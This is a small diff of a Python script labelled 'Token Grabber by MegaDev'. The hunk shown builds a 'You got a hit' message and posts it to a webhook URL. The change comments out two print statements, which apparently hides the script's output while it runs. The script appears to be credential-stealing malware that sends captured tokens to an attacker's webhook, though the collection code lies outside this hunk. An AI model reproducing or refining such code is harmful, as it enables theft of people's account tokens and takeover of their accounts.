@@ -171,9 +171,9 @@ def main():
         message = {"username":"Token Grabber by MegaDev",'content':'You got a hit. ' + ping,"embeds":embeds}
         payload = json.dumps(message)
 
-        print(message)
+        #print(message)
         response = requests.post(WEBHOOK_URL,headers=headers,data=payload.encode())
-        print(response.text)
+        #print(response.text)
     else:
         print('MODE invalid or experimental is not enabled')
 if __name__ == '__main__':
